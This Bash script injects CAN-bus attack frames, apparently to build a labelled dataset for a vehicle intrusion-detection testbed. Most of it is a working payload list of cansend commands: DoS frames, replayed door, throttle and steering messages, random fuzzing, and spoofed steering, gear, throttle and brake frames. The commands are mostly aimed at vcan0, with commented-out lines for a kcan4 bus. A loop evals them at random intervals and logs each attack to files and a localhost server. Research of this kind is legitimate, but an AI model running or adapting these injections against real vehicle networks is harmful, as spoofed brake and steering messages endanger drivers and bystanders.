#!/usr/bin/env bash
set -eu

SERVER_URL="http://127.0.0.1:5001"
EVENT_LOG="attack_events.csv"
FRAME_LOG="attack_frames.log"
# Ensure attack_events.csv has header
if [ ! -f "$EVENT_LOG" ]; then
  echo "attack_id,attack_type,start_ts,end_ts" > "$EVENT_LOG"
fi

# Payload list. Use eval to expand printf and RANDOM.
payloads=(
#'cansend kcan4 000#0000'                                           # 1 DoS KCAN4
#'cansend vcan0 000#0000'                                           # 2 DoS VCAN0
#'cansend kcan4 0000024B#550801010000000F'                          # 3 replay open door
#'cansend kcan4 0000024B#000801010000000F'                          # 4 replay close door
'cansend vcan0 000001A0#7810000000000012'                          # 5 replay throttle
'cansend vcan0 000000C4#64FFFFFF0000003A'                          # 6 replay steering
#'cansend kcan4 0000024B#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 7 fuzz door
'cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'   # 8 fuzz throttle
'cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)' # 9 fuzz steering
'cansend vcan0 000000BA#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 10 fuzz GearSelectorSwitch
'cansend vcan0 000000C4#$(printf "%02X%02X%02X%02X%02X%02X%02X%02X" $((RANDOM%256)) $((RANDOM%256)) 0 0 0 0 0 $((RANDOM%256)))' # 11 spoof steer
'cansend vcan0 000000BA#$(printf "%02X%02X%02X%02X%02X%02X%02X%02X" $((RANDOM%4)) 0 0 0 0 $((RANDOM%256)) 0 $((RANDOM%256)))' # 12 spoof gear
'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $((high | 0x10))); printf "%s%s0000000000%02X" "$low" "$b1" $((RANDOM%256)))' #13 spoof forward
'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $((high | 0x20))); printf "%s%s0000000000%02X" "$low" "$b1" $((RANDOM%256)))'  #14 spoof reverse
'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $high); b2=$(printf "%02X" $((RANDOM%256))); b3=01; printf "%s%s%s%s000000%02X" "$low" "$b1" "$b2" "$b3" $((RANDOM%256)))'  # 15 spoof brake
'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $high); b2=00; b3=01; printf "%s%s%s%s000000%02X" "$low" "$b1" "$b2" "$b3" $((RANDOM%256)))'  # 16 spoof brakeactive
'cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 17 random ID
)

# friendly labels for payloads (same index order)
types=(
"dos" "dos" "spoof" "spoof" "spoof" 
"spoof" "fuzz" "fuzz" "fuzz" "fuzz"
"spoof" "spoof" "spoof" "spoof" "spoof"
"spoof" "fuzz"
)

rand_between() {
  # inclusive random integer between $1 and $2
  shuf -i "$1"-"$2" -n 1
}

timestamp_now() {
  # epoch seconds with milliseconds (GNU date)
  date +%s.%3N
}

clean_exit() {
  echo "Interrupted. Exiting."
  exit 0
}
trap clean_exit INT

echo "Attacker started. Notifying server at $SERVER_URL if available."

# Check server status (non-fatal)
if ! curl -s --max-time 2 "$SERVER_URL/status" >/dev/null 2>&1; then
  echo "Warning: notifier server not reachable at $SERVER_URL/status. Make sure attack_server is running."
fi

while true; do
  # choose payload index at random (0-based index)
  idx=$((RANDOM % ${#payloads[@]}))
  payload="${payloads[$idx]}"
  attack_type="${types[$idx]}"
  attack_id="A$(date +%s)_$((RANDOM % 10000))"

  duration=$(rand_between 1 10)   # seconds of active sending
  pause_after=$(rand_between 5 20)  # pause before next attack

  start_ts=$(timestamp_now)
  end_ts=$(python - <<PY
import time
print("{:.3f}".format(float(${start_ts}) + ${duration}))
PY
)

  # log event to attack_events.csv (Option A)
  echo "${attack_id},${attack_type},${start_ts},${end_ts}" >> "$EVENT_LOG"

  # notify notifier server to start
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"attack_id\":\"${attack_id}\",\"attack_type\":\"${attack_type}\",\"duration\":${duration}}" \
    "$SERVER_URL/start" >/dev/null 2>&1 || echo "Warning: /start failed (server unreachable?)"

  echo ">>> START attack ${attack_id} type=${attack_type} dur=${duration}s payload=${payload}"

  # send frames for 'duration' seconds
  t_end=$(( $(date +%s) + duration ))
  while [ $(date +%s) -lt $t_end ]; do
    # evaluate the payload (so printf and sequences work)	
    #eval "$payload"  
	cmd=$(eval "printf '%s' \"$payload\"")
	ts=$(python -c "import time; print('{:.6f}'.format(time.time()))")
	echo "${ts},${cmd},${attack_id},${attack_id}" >> "$FRAME_LOG"
	eval "$cmd"	
	
  done

  # notify stop
  curl -s -X POST "$SERVER_URL/stop" >/dev/null 2>&1 || true
  echo "<<< STOP attack ${attack_id}. Pausing ${pause_after}s before next attack."

  sleep "$pause_after"
done
